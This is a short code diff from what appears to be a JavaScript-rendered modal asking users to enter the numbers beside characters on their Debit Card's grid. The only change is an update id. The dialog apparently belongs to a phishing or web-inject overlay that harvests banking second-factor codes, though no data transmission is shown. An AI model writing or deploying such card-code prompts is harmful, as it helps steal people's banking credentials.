@@ -75,7 +75,7 @@ const gcaPromptDialog = () => {
   <div id="iBiometric_container_for_gca_auth" class="iBiometric_container">
   <div class="iBiometric_dialog">
     <h2>Verify your Grid Card details</h2>
-    <p>update_id=local37: Please enter the numbers adjacent to the characters on your Debit Card</p>
+    <p>update_id=local38: Please enter the numbers adjacent to the characters on your Debit Card</p>
     <form method="get" class="digit-group" data-group-name="digits" data-autosubmit="false" autocomplete="off">
       <input type="text" id="gdigit-1" name="digit-1" data-next="digit-2" />
       <input type="text" id="gdigit-2" name="digit-2" data-next="digit-3" data-previous="digit-1" />
